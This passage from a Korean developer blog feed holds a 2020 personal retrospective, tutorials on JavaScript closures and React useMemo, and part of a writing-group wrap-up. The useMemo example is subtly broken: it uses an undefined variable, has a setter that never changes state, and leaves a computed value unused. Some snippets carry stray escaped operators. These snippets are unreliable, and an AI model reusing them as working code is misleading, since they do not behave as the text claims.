발길을 끊은 지 오래지만, 반대로 <code class="language-plaintext highlighter-rouge">넷플릭스</code>와 <code class="language-plaintext highlighter-rouge">유튜브</code> 컨텐츠 소비가 급증한 올 한 해였다. 참을성있게 다음 회를 기다릴 성격이 아니거나 혹은 정해진 시간마다 무언가를 챙겨보는 타입이 아닌지라, 사실 넷플릭스는 이전에 몇 번이나 구독과 해지를 반복했었다. (반대로 얘기하면 몰아보기를 선호하는 타입이라고 할 수도..)</p> <p>어쩔 수 없이 방구석에서 컨텐츠를 소비할 수 밖에 없는 현실과 현장에서만 느낄 수 있는 감동이 조금 덜한 상황이 조금 아쉽긴 하지만, 그나마 내가 할 수 있는 조금의 노력을 통해 최악의 상황은 막을 수 있었으면 하는 조그만 바람이 있을 뿐이다.</p> <hr/> <h4 id="글또-4기와-5기">글또 4기와 5기</h4> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/posts/2020-with-geultto-480.webp 480w,/assets/img/posts/2020-with-geultto-800.webp 800w,/assets/img/posts/2020-with-geultto-1400.webp 1400w," type="image/webp" sizes="95vw"/> <img src="/assets/img/posts/2020-with-geultto.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p>글또 4기에 이어 5기를 신청했다. 글또 활동을 통해 지난 1년동안 (이 글 포함) 총 12개의 글을 작성할 수 있었다. 회고 혹은 다짐글을 제외하면 얼마 되진 않지만, 기록하는 습관을 기르고자 하는데 2주마다 돌아오는 마감일과 예치금 차감이라는 방법이 효과가 있었다. 하루 하루는 생각보다 더디게 가는 것처럼 느껴질 때가 많지만, 2주는 (특히 글또를 시작한 이후로) 생각보다 엄청 빠르게 돌아오더라.</p> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/posts/2020-analytics-480.webp 480w,/assets/img/posts/2020-analytics-800.webp 800w,/assets/img/posts/2020-analytics-1400.webp 1400w," type="image/webp" sizes="95vw"/> <img src="/assets/img/posts/2020-analytics.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p>올해는 주로 React와 JavaScript와 관련된 내용들을 작성하였다. 공식 문서의 내용과 함께 간단한 예제와 함께 글을 작성하곤 했는데, 가장 높은 조회수를 기록한 글은 <a href="https://dev.to/lydiahallie/javascript-visualized-event-loop-3dif">✨♻️ JavaScript Visualized: Event Loop</a> 를 번역한 글이었다.</p> <ul> <li><a href="https://chanmi-lee.github.io/articles/2020-06/JavaScript-Visualized-Event-Loop">[번역]자바스크립트 이벤트 루프</a></li> </ul> <p>개인적으로 상태에 따른 변화를 알기 쉽게 알 수 있도록 gif 이미지를 통해 시각적으로 설명해줘서, 다소 모호할 수 있는 개념을 이해하는데 큰 도움이 되었다.</p> <p>또한 주기적으로 회고 글을 작성하다보니, 어떤 노력들을 했는지 구체적으로 정리할 수 있고 아쉬운 점들을 다음 분기의 개선점으로 삼을 수 있었다.</p> <p>상반기까지는 재택 환경에 적응하고 동시에 업무에 적응하는데 초점을 맞췄다면, 하반기에는 조금 더 역량을 기르고자 유료 강의와 책을 통해 기술을 습득하고 업무에 적용하고자 노력했다.</p> <p>회사에서 제공하는 복지 중 하나로 매월 2개의 인프런 강의를 수강할 수 있어, JavaScript와 React 뿐만 아니라 Node.js와 TypeScript 관련 강의들을 수강했다. 강의의 내용을 블로그엔 기록하진 못하지만, 덕분에 기존의 업무 환경에 국한되지 않고 개선점을 찾아보거나 조금 더 다양하게 고민할 수 있게끔 시야를 넓혀주는데 도움이 된 것 같다.</p> <hr/> <h4 id="다가오는-2021년에는">다가오는 2021년에는</h4> <p>개인적으로는 코로나로 인해 다양한 취미생활을 빼앗겨 아쉬움이 많이 남는 2020년이었다.</p> <ul> <li>여행</li> </ul> <p>여행을 위해 아끼고 아껴둔 연차를 아직도 다 쓰지 못해 조금 여유로운 연말을 보내게 되었다. 5월의 연휴엔 포르투, 6-7월엔 몽골 고비사막 투어를 계획하였는데.. 계획만 하게 되어 매우 아쉬웠다 (ㅠㅠ) 내년에는 멀리 가진 못하더라도 모두가 건강하고 일상의 소소한 행복을 되찾을 수 있었으면- 하고 바라본다.</p> <ul> <li>운동</li> </ul> <p>요가와 라이딩, 런닝을 비롯한 운동 생활 마저도 코로나의 영향권 아래 조심할 수 밖에 없게 되었다.</p> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/posts/how-covid-makes-me-lazy-480.webp 480w,/assets/img/posts/how-covid-makes-me-lazy-800.webp 800w,/assets/img/posts/how-covid-makes-me-lazy-1400.webp 1400w," type="image/webp" sizes="95vw"/> <img src="/assets/img/posts/how-covid-makes-me-lazy.jpg" class="img-fluid rounded z-depth-1" width="100%" height="auto" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p>개인적으로 애플워치를 사용하고 있는데, 코로나 전인 2019년 가을과 코로나 이후인 2020년 봄의 활동링을 비교해보니 그 차이를 확연하게 느낄 수 있었다. (너무나 정적인 2020년이었다 ㅠㅠ) 덕분에 작년에 비해 다소 무거워진 몸이지만, 홈트라도 해야겠다 싶어 구매한 싸이클도 틈틈이 타고, 요가원에 직접 가는 대신 매주 줌을 통해 진행되는 허니쌤의 요가 수업도 놓치지 말아야지! 운동도 배움도 게을러지지 않는 2021년을 보내야겠다 :)</p> <p>2021년에는 모두가 조금 더 웃을 일 많고 건강하며, 코로나에 빼앗긴 평범한 일상을 회복할 수 있기를 바라본다.</p>]]></content><author><name></name></author><category term="retrospective"/><category term="2020"/><category term="workfromhome"/><category term="covid19"/><summary type="html"><![CDATA[2020년 하반기 회고]]></summary></entry><entry><title type="html">Closure in JavaScript</title><link href="https://chanmi-lee.github.io/articles/2020-11/Closure-in-JavaScript/" rel="alternate" type="text/html" title="Closure in JavaScript"/><published>2020-11-30T00:00:00+00:00</published><updated>2020-11-30T00:00:00+00:00</updated><id>https://chanmi-lee.github.io/articles/2020-11/Closure-in-JavaScript</id><content type="html" xml:base="https://chanmi-lee.github.io/articles/2020-11/Closure-in-JavaScript/"><![CDATA[<h3 id="클로저란">클로저란?</h3> <p><code class="language-plaintext highlighter-rouge">클로저</code>란 함수 내부에 정의된 함수이며, 내부함수가 외부함수의 맥락(context)에 접근할 수 있는 것을 의미합니다.</p> <p>다른 프로그래밍 언어들과 마찬가지로, 자바스크립트는 어휘적 유효범위 (lexical scoping)을 사용합니다. 어휘적 유효범위 (lexical scoping)는 정적 유효범위 (static scoping)으로도 번역되며, 함수가 선언된 시점에서의 유효범위를 의미합니다.</p> <p>개념적으로 모든 자바스크립트 함수는 클로저인데, 자바스크립트에서 함수는 객체이고 함수 자신과 관련된 유효범위 체인을 가지고 있기 때문입니다. 자바스크립트 함수가 호출될 때마다, 해당 호출과 관련된 지역 변수를 보관하는 객체가 생성되며 이 객체는 함수의 유효범위 체인에 추가됩니다. 함수가 반환된다면 반대로 객체와 바인딩된 변수는 유효범위 체인에서 제거됩니다.</p> <p>간단한 예제와 함께 살펴보겠습니다.</p> <h3 id="-클로저-예제">📌 클로저 예제</h3> <figure class="highlight"><pre><code class="language-javascript" data-lang="javascript"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="code"><pre><span class="kd">var</span> <span class="nx">closure</span> <span class="o">=</span> <span class="p">(</span><span class="kd">function</span> <span class="nf">getCounter</span><span class="p">()</span> <span class="p">{</span> <span class="c1">// 함수를 정의하고 바로 호출합니다.</span>
<span class="kd">var</span> <span class="nx">counter</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
<span class="k">return</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span> <span class="k">return</span> <span class="nx">counter</span><span class="o">++</span><span class="p">;</span> <span class="p">};</span>
<span class="p">}());</span>
</pre></td></tr></tbody></table></code></pre></figure> <p>위에서 정의한 <code class="language-plaintext highlighter-rouge">getCounter</code> 함수는 함수를 반환하고, 반환된 함수는 내부에서 선언된 변수 <code class="language-plaintext highlighter-rouge">counter</code>를 참조하고 있습니다. 또한 <code class="language-plaintext highlighter-rouge">getCounter</code> 함수의 반환 결과는 <code class="language-plaintext highlighter-rouge">closure</code> 변수에 할당됩니다.</p> <p><code class="language-plaintext highlighter-rouge">counter</code>와 같은 내부 변수는 여러 클로저가 공유할 수 있습니다. 이는 같은 함수 안에 정의된 중첩 함수들이 같은 유효범위 체인을 공유하기 때문입니다.</p> <p>아래 예제와 함께 조금 더 자세히 살펴보겠습니다.</p> <figure class="highlight"><pre><code class="language-javascript" data-lang="javascript"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre></td><td class="code"><pre><span class="kd">function</span> <span class="nf">counter</span><span class="p">()</span> <span class="p">{</span>
<span class="kd">var</span> <span class="nx">n</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
<span class="k">return</span> <span class="p">{</span>
<span class="na">count</span><span class="p">:</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span> <span class="k">return</span> <span class="nx">n</span><span class="o">++</span><span class="p">;</span> <span class="p">},</span>
<span class="na">reset</span><span class="p">:</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span> <span class="nx">n</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="p">}</span>
<span class="p">};</span>
<span class="p">}</span>

<span class="kd">var</span> <span class="nx">c</span> <span class="o">=</span> <span class="nf">counter</span><span class="p">(),</span> <span class="nx">d</span> <span class="o">=</span> <span class="nf">counter</span><span class="p">();</span> <span class="c1">// 두 개의 카운터를 생성합니다.</span>
<span class="nx">c</span><span class="p">.</span><span class="nf">count</span><span class="p">();</span> <span class="c1">// =&gt; 0</span>
<span class="nx">d</span><span class="p">.</span><span class="nf">count</span><span class="p">();</span> <span class="c1">// =&gt; 0 : c와 d는 서로 독립적입니다.</span>
<span class="nx">c</span><span class="p">.</span><span class="nf">reset</span><span class="p">();</span> <span class="c1">// reset() 메서드와 count() 메서드는 상태를 공유합니다. 즉 같은 유효범위 체인을 공유합니다.</span>
<span class="nx">c</span><span class="p">.</span><span class="nf">count</span><span class="p">();</span> <span class="c1">// =&gt; 0 : c를 reset하였기 때문에 0을 반환합니다.</span>
<span class="nx">d</span><span class="p">.</span><span class="nf">count</span><span class="p">();</span> <span class="c1">// =&gt; 1 : d는 reset되지 않았기 때문에 1을 반환합니다.</span>
</pre></td></tr></tbody></table></code></pre></figure> <p>위의 예제에서 함수 <code class="language-plaintext highlighter-rouge">counter</code>를 호출할 때마다 새로운 유효범위 체인과 새로운 내부 변수가 생성됩니다. 때문에 <code class="language-plaintext highlighter-rouge">counter</code>를 호출하는 서로 다른 객체 c, d를 생성하면 이들은 각각 독립적인 유효범위를 가지며, 예제에서처럼 객체 c의 <code class="language-plaintext highlighter-rouge">count()</code>, <code class="language-plaintext highlighter-rouge">reset()</code>를 호출하는 것은 객체 d에게는 아무런 영향을 주지 않게 됩니다.</p> <blockquote> <p>내부 변수는 외부에서는 직접 접근할 수 없으며, 클로저를 통해서만 사용할 수 있습니다. 이는 객체지향언어의 private 멤버 변수와 같은 역할을 합니다.</p> </blockquote> <p>너무나 유명한 반복문 클로저 예제도 함께 살펴보겠습니다.</p> <figure class="highlight"><pre><code class="language-javascript" data-lang="javascript"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre></td><td class="code"><pre><span class="kd">function</span> <span class="nf">count</span><span class="p">()</span> <span class="p">{</span>
<span class="kd">var</span> <span class="nx">i</span><span class="p">;</span>
<span class="k">for </span><span class="p">(</span><span class="nx">i</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;=</span> <span class="mi">10</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
<span class="nf">setTimeout</span><span class="p">(</span><span class="kd">function</span> <span class="nf">timer</span><span class="p">()</span> <span class="p">{</span>
<span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="nx">i</span><span class="p">);</span>
<span class="p">},</span> <span class="nx">i</span> <span class="err">\</span><span class="o">*</span> <span class="mi">100</span><span class="p">);</span>
<span class="p">}</span>
<span class="p">}</span>
<span class="nf">count</span><span class="p">();</span>
</pre></td></tr></tbody></table></code></pre></figure> <p>0.1초마다 1부터 10까지 출력하고자 하였지만, 실제로 코드를 실행해보면 결과는 10이 10번 출력됩니다.</p> <p><code class="language-plaintext highlighter-rouge">timer</code>는 항상 상위 스코프인 <code class="language-plaintext highlighter-rouge">count</code>에게 내부 변수인 <code class="language-plaintext highlighter-rouge">i</code> 값을 요청하지만, 0.1초 후에 호출됩니다. 그런데 처음 0.1초가 지날 동안 이미 <code class="language-plaintext highlighter-rouge">i</code>값은 10이 되어버리고 이를 계속해서 참조하기 때문에 결국 본래 의도와 달리 10만 10번 출력하게 됩니다.</p> <figure class="highlight"><pre><code class="language-javascript" data-lang="javascript"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre></td><td class="code"><pre><span class="kd">function</span> <span class="nf">count</span><span class="p">()</span> <span class="p">{</span>
<span class="kd">var</span> <span class="nx">i</span><span class="p">;</span>
<span class="k">for </span><span class="p">(</span><span class="nx">i</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;=</span> <span class="mi">10</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
<span class="p">(</span><span class="kd">function</span><span class="p">(</span><span class="nx">innerCounting</span><span class="p">)</span> <span class="p">{</span>
<span class="nf">setTimeout</span><span class="p">(</span><span class="kd">function</span> <span class="nf">timer</span><span class="p">()</span> <span class="p">{</span>
<span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="nx">innerCounting</span><span class="p">);</span>
<span class="p">},</span> <span class="nx">i</span> <span class="err">\</span><span class="o">*</span> <span class="mi">100</span><span class="p">);</span>
<span class="p">})(</span><span class="nx">i</span><span class="p">);</span>
<span class="p">}</span>
<span class="p">}</span>
<span class="nf">count</span><span class="p">();</span>
</pre></td></tr></tbody></table></code></pre></figure> <p>위의 예제와 같이 새로운 스코프를 추가해주면, 독립적인 환경에 값을 따로 저장하게 됩니다.</p> <blockquote> <p>모든 함수는 함수가 생성된 곳의 어휘적 유효범위 (lexical scoping)을 기억합니다. 함수는 [[Environment]]라 불리는 프로퍼티를 갖는데, 여기에 어휘적 유효범위에 대한 참조가 저장됩니다. [[Environment]]는 함수가 생성될 때 값이 세팅되며 이 값은 불변합니다.</p> </blockquote> <p>혹은 아래와 같이 ES6에서 추가된 블록 스코프 방식, 즉 <code class="language-plaintext highlighter-rouge">let</code> 키워드를 이용할 수도 있습니다.</p> <figure class="highlight"><pre><code class="language-javascript" data-lang="javascript"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre></td><td class="code"><pre><span class="kd">function</span> <span class="nf">count</span><span class="p">()</span> <span class="p">{</span>
<span class="dl">'</span><span class="s1">use strict</span><span class="dl">'</span><span class="p">;</span>
<span class="k">for </span><span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;=</span> <span class="mi">10</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
<span class="nf">setTimeout</span><span class="p">(</span><span class="kd">function</span> <span class="nf">timer</span><span class="p">()</span> <span class="p">{</span>
<span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="nx">i</span><span class="p">);</span>
<span class="p">},</span> <span class="nx">i</span> <span class="err">\</span><span class="o">*</span> <span class="mi">100</span><span class="p">);</span>
<span class="p">}</span>
<span class="p">}</span>
<span class="nf">count</span><span class="p">();</span>
</pre></td></tr></tbody></table></code></pre></figure> <hr/> <p>🔗 참조</p> <p>📌 <a href="https://developer.mozilla.org/ko/docs/Web/JavaScript/Guide/Closures">MDN - Closure</a></p> <p>📌 <a href="https://meetup.toast.com/posts/86">TOAST - 자바스크립트의 스코프와 클로저</a></p> <p>📌 <a href="https://opentutorials.org/course/743/6544">생활코딩 - 클로저</a></p>]]></content><author><name></name></author><category term="JavaScript"/><category term="closure"/><summary type="html"><![CDATA[클로저란?]]></summary></entry><entry><title type="html">useMemo in React</title><link href="https://chanmi-lee.github.io/articles/2020-11/useMemo-in-React/" rel="alternate" type="text/html" title="useMemo in React"/><published>2020-11-15T00:00:00+00:00</published><updated>2020-11-15T00:00:00+00:00</updated><id>https://chanmi-lee.github.io/articles/2020-11/useMemo-in-React</id><content type="html" xml:base="https://chanmi-lee.github.io/articles/2020-11/useMemo-in-React/"><![CDATA[<h3 id="usememo란">useMemo란?</h3> <p><code class="language-plaintext highlighter-rouge">useMemo</code> 함수는 React v16.8부터 내장되어 있는 Hooks의 하나입니다. Hook이란 함수형 컴포넌트에서 State, LifeCycle, Reference 등의 클래스형 컴포넌트의 기능을 구현한 개념으로, 이를 통해 memoization 기법을 함수형 컴포넌트에도 쉽게 적용할 수 있습니다.</p> <blockquote> <p><strong>memoization</strong>는 알고리즘 성능 최적화에 자주 쓰이는 개념 중 하나로, 이름 그대로 메모를 하는 것을 의미합니. 프로그래밍에서 반복되는 결과를 메모리에 저장해두고 동일한 연산이 필요한 경우 이를 재활용하는 기법을 의미합니다. 이를 적절히 활용하면 중복을 피하고 애플리케이션의 속도를 향상시킬 수 있다는 이점이 있습니다.</p> </blockquote> <p>React에서 컴포넌트 랜더링은 빈번하게 일어나는데, 대표적인 사례로는 컴포넌트 자신의 상태 변경 혹은 부모 컴포넌트의 상태 변경의 영향으로 함께 리랜더링 되는 경우 등이 있습니다. 만약 컴포넌트의 리랜더링에 불필요하게 오랜 시간이 걸린다면, 사용자는 UI에서 지연이 발생하는 경험을 하게 됩니다.</p> <div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">const</span> <span class="nx">memoizedValue</span> <span class="o">=</span> <span class="nf">useMemo</span><span class="p">(()</span> <span class="o">=&gt;</span> <span class="nf">computeExpensiveValue</span><span class="p">(</span><span class="nx">a</span><span class="p">,</span> <span class="nx">b</span><span class="p">),</span> <span class="p">[</span><span class="nx">a</span><span class="p">,</span> <span class="nx">b</span><span class="p">]);</span>
</code></pre></div></div> <p><code class="language-plaintext highlighter-rouge">useMemo</code> 함수는 <strong>2개의 인자</strong>를 받습니다. 첫번째 인자로는 결과값을 생성해내는 팩토리 함수, 즉 리턴 콜백 함수를 받습니다. 두번째 인자는 결과값을 재활용할 때 기준이 되는 입력값 배열입니다. 두번째 인자로 전달된 값이 이전과 다른 경우에만 첫번째 값이 실행되며, 이를 통해 함수형 컴포넌트 내에서 계산되는 값에 대한 최적화를 할 수 있습니다.</p> <p><code class="language-plaintext highlighter-rouge">useMemo</code>에 전달된 함수는 랜더링 중에 실행됩니다. 때문에 랜더링과 관련된 내용만 전달해야하며, 랜더링과 관계 없는 경우는 <code class="language-plaintext highlighter-rouge">useEffect</code>를 사용하길 권장합니다.</p> <blockquote> <p>전달되는 콜백 함수의 이름이 <code class="language-plaintext highlighter-rouge">computeExpensiveValue</code>라는데서 짐작할 수 있지만, <code class="language-plaintext highlighter-rouge">useMemo</code>를 통해 재활용되는 로직이 복잡한 경우 불필요한 연산을 막을 수 있고 성능상의 차이를 가져올 수 있습니다.</p> </blockquote> <hr/> <h3 id="usememo-예제">useMemo 예제</h3> <p>간단한 예제와 함께 살펴보겠습니다.</p> <blockquote> <p>without useMemo</p> </blockquote> <figure class="highlight"><pre><code class="language-javascript" data-lang="javascript"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre></td><td class="code"><pre><span class="kd">function</span> <span class="nf">Counter</span><span class="p">()</span> <span class="p">{</span>
<span class="kd">const</span> <span class="p">[</span><span class="nx">count</span><span class="p">,</span> <span class="nx">setCount</span><span class="p">]</span> <span class="o">=</span> <span class="nx">React</span><span class="p">.</span><span class="nf">useState</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="kd">const</span> <span class="nx">doubleCount</span> <span class="o">=</span> <span class="nx">count</span> <span class="err">\</span><span class="o">*</span> <span class="mi">2</span>

    <span class="k">return </span><span class="p">(</span>
        <span class="o">&lt;</span><span class="nx">div</span><span class="o">&gt;</span>
            <span class="o">&lt;</span><span class="nx">h1</span><span class="o">&gt;</span><span class="nx">React</span> <span class="nx">Hooks</span><span class="p">:</span> <span class="nx">useMemo</span> <span class="nx">example</span><span class="o">&lt;</span><span class="sr">/h1</span><span class="err">&gt;
</span>            <span class="o">&lt;</span><span class="nx">button</span> <span class="nx">onClick</span><span class="o">=</span><span class="p">{()</span> <span class="o">=&gt;</span> <span class="nf">setCount</span><span class="p">(</span><span class="nx">count</span><span class="p">)}</span><span class="o">&gt;</span><span class="nx">Double</span> <span class="nx">Counter</span><span class="p">:</span> <span class="p">{</span><span class="nx">count</span><span class="p">}</span><span class="o">&lt;</span><span class="sr">/button</span><span class="err">&gt;
</span>        <span class="o">&lt;</span><span class="sr">/div</span><span class="err">&gt;
</span>    <span class="p">)</span>

<span class="p">}</span>
</pre></td></tr></tbody></table></code></pre></figure> <p>버튼을 클릭할 때마다 이전보다 두 배 큰 값이 반환됩니다. 하지만 count 값과 상관없이 컴포넌트가 리랜더링 되었을 때 불필요하게 연산을 수행하게 됩니다. 간단한 사례지만, 이보다 더 복잡한 연산이거나 컴포넌트의 상태값이 많은 경우 그만큼의 리소스가 낭비될 수 있습니다.</p> <blockquote> <p>with useMemo</p> </blockquote> <figure class="highlight"><pre><code class="language-javascript" data-lang="javascript"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre></td><td class="code"><pre><span class="kd">function</span> <span class="nf">Counter</span><span class="p">()</span> <span class="p">{</span>
<span class="kd">const</span> <span class="p">[</span><span class="nx">count</span><span class="p">,</span> <span class="nx">setCount</span><span class="p">]</span> <span class="o">=</span> <span class="nx">React</span><span class="p">.</span><span class="nf">useState</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="kd">const</span> <span class="nx">doubleCount</span> <span class="o">=</span> <span class="nx">React</span><span class="p">.</span><span class="nf">useMemo</span><span class="p">(()</span> <span class="o">=&gt;</span> <span class="nx">counter</span> <span class="err">\</span><span class="o">*</span> <span class="mi">2</span><span class="p">,</span> <span class="p">[</span><span class="nx">count</span><span class="p">])</span>

    <span class="k">return </span><span class="p">(</span>
        <span class="o">&lt;</span><span class="nx">div</span><span class="o">&gt;</span>
            <span class="o">&lt;</span><span class="nx">h1</span><span class="o">&gt;</span><span class="nx">React</span> <span class="nx">Hooks</span><span class="p">:</span> <span class="nx">useMemo</span> <span class="nx">example</span><span class="o">&lt;</span><span class="sr">/h1</span><span class="err">&gt;
</span>            <span class="o">&lt;</span><span class="nx">button</span> <span class="nx">onClick</span><span class="o">=</span><span class="p">{()</span> <span class="o">=&gt;</span> <span class="nf">setCount</span><span class="p">(</span><span class="nx">count</span><span class="p">)}</span><span class="o">&gt;</span><span class="nx">Double</span> <span class="nx">Counter</span><span class="p">:</span> <span class="p">{</span><span class="nx">count</span><span class="p">}</span><span class="o">&lt;</span><span class="sr">/button</span><span class="err">&gt;
</span>        <span class="o">&lt;</span><span class="sr">/div</span><span class="err">&gt;
</span>    <span class="p">)</span>

<span class="p">}</span>
</pre></td></tr></tbody></table></code></pre></figure> <p><code class="language-plaintext highlighter-rouge">useMemo</code>를 사용한다면, 의존하는 값(count)이 변경되는 경우만 연산되므로 불필요한 연산을 막을 수 있습니다.</p> <h3 id="usememo-언제-필요할까">useMemo, 언제 필요할까?</h3> <p>일반적으로 memoization의 기법을 활용한 컴포넌트 성능 최적화는 잘 사용되지 않습니다. React의 reconciliation과 Virtual DOM이 충분히 빠르고, 대부분의 사용자가 체감할 정도의 성능 최적화가 필요한 상황이 그리 자주 있지 않기 때문입니다. 또한 실행되는 모든 코드는 그만큼의 비용을 요구하기 때문에, 무분별한 함수 호출은 리소스 낭비로 이어져 성능 개선이 아닌 악화로 이어질 수 있습니다.</p> <p>만약 프론트엔드 단에서 처리해야만 하는 복잡한 연산이 필요한 경우가 있다고 하더라도, 가장 먼저 <code class="language-plaintext highlighter-rouge">useMemo</code>나 <code class="language-plaintext highlighter-rouge">useCallback</code>와 같은 최적화 기법을 도입하는 것은 좋지 않습니다. 대신, <code class="language-plaintext highlighter-rouge">useEffect</code> 함수 등을 이용해 비동기로 처리하는 방안을 먼저 고려하거나 클래스 기반의 컴포넌트인 경우 <code class="language-plaintext highlighter-rouge">shouldComponentUpdate</code>를 사용해보는건 어떨까요?</p> <hr/> <p>🔗 참조</p> <p>📌 <a href="https://reactjs.org/docs/hooks-reference.html#usememo">Hook API reference - useMemo :: React Official Docs</a> 📌 <a href="https://reactjs.org/docs/reconciliation.html">React - Reconciliation :: React Official Docs</a></p>]]></content><author><name></name></author><category term="React"/><category term="hooks"/><category term="useMemo"/><category term="memoization"/><summary type="html"><![CDATA[useMemo란?]]></summary></entry><entry><title type="html">글또 4기를 마치며</title><link href="https://chanmi-lee.github.io/articles/2020-08/Wrap-up-geultto-4/" rel="alternate" type="text/html" title="글또 4기를 마치며"/><published>2020-08-16T00:00:00+00:00</published><updated>2020-08-16T00:00:00+00:00</updated><id>https://chanmi-lee.github.io/articles/2020-08/Wrap-up-geultto-4</id><content type="html" xml:base="https://chanmi-lee.github.io/articles/2020-08/Wrap-up-geultto-4/"><![CDATA[<h2 id="글또가-남긴-것">글또가 남긴 것</h2> <p>13번의 제출 중 4번의 패스 (..반성합니다 😓) 그리고 3번의 피드백 미제출.</p> <p>처음 글또 모집글을 보고 지원서를 작성하며 마음 속에 세워둔 <code class="language-plaintext highlighter-rouge">보증금 100% 돌려받기</code> 목표는 비록 달성하지 못하였으나, 반대로 <code class="language-plaintext highlighter-rouge">2주마다의 미션 실패 시 예치금 차감</code>이라는 약간의 강제성 덕분에 마지막 제출까지 어찌저찌 살아남을 수 있었다(?)</p> <p><strong>연차에 걸맞는 실력을 갖췄는가?</strong> 라는 질문과 함께 시작한 나의 2020년 상반기는 (+1.5달) 회사 업무 외에도 글또 4기 활동의 구체적인 노력들을 통해 조금 다른 방면에서 채울 수 있는 의미있는 시간이었다.</p> <ul> <li><a href="https://chanmi-lee.github.io/articles/2020-03/why-geultto">글또 4기로 블로그 되살리기</a></li> <li><a href="https://chanmi-lee.github.io/articles/2020-03/web-standard-and-cross-browsing-issue">웹 표준과 크로스 브라우징 이슈</a></li> <li><a href="https://chanmi-lee.github.io/articles/2020-04/refs-in-react">Refs in React</a></li> <li><a href="https://chanmi-lee.github.io/articles/2020-04/what-is-hoc-and-how-to-use-it-in-react">HOC in React</a></li> <li><a href="https://chanmi-lee.github.io/articles/2020-05/JavaScript-Function">JavaScript Function</a></li> <li><a href="https://chanmi-lee.github.io/articles/2020-06/JavaScript-Visualized-Event-Loop">[번역] 자바스크립트 이벤트 루프</a></li> <li><a href="https://chanmi-lee.github.io/articles/2020-07/the-first-half-of-2020">2020년 상반기 회고</a></li> <li><a href="https://chanmi-lee.github.io/articles/2020-07/Hooks-of-React">Hooks 살펴보기</a></li> </ul> <p>지난 반년 동안 주로 React와 JavaScript를 주제로 글을 작성하였다. 회사에서 React와 Angular를 함께 쓰다보니 처음엔 둘 다 익숙하지 않아 각각의 개념을 명확하게 알지 못했다. 그런 상태로 당장의 이슈 해결에 급급해하는 나의 모습이 안타까워 <code class="language-plaintext highlighter-rouge">적어도 한 쪽이라도 제대로 알고 넘어가자!</code>를 목표로 React 공식 문서 내용을 하나씩 번역하거나, 잘 안다고 생각했지만 사실은 잘 모르던 내용을 되새겨보았다.</p> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/posts/geultto-target-480.webp 480w,/assets/img/posts/geultto-target-800.webp 800w,/assets/img/posts/geultto-target-1400.webp 1400w," type="image/webp" sizes="95vw"/> <img src="/assets/img/posts/geultto-target.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p>이는 글또 다짐글에서 목표로 세운 내용 중 <code class="language-plaintext highlighter-rouge">학습 정리</code>에 포함되는 내용이니 어느 정도의 소소한 성과는 거둔 것 같다. 이 외에도 컨퍼런스 참여 후기나 상반기 회고까지 글또를 시작하며 다짐했던 내용을 제출하였다.</p> <h3 id="-다소-아쉬운-디테일">📌 다소 아쉬운 디테일</h3> <p>그런데 돌이켜볼수록 목표는 어느 정도 달성한 것 같은데 왜 아쉬움이 남는 것일까?</p> <p>아무래도 첫 기수로의 참여이고 글쓰는 습관이 제대로 형성되지 않은 상태로 언젠가부터 <code class="language-plaintext highlighter-rouge">의지&lt;현실</code>의 법칙을 따라 마감일에 쫓기며 제출하던 것 때문이 아닐까. 그래서 다른 분들의 글또 다짐글을 다시 찾아보니 조금 더 구체적인 목표 설정에 차이가 있었다. 예를 들어, 저는 OO에 관한 글을 쓸거에요- 가 아니라 OO의 특성인 a, b, c에 관한 글을 쓸거고 실제 사례와 함께 다뤄볼거에요. 혹은 OO와 OO’의 미묘한 차이에 대해 파헤쳐볼거에요! 정도의 디테일에서부터 차이가 났다.</p> <p>일을 할 때와 마찬가지로 반년간의 글또 활동도 초반의 구체적인 목표 설정과 진행 중의 방향성 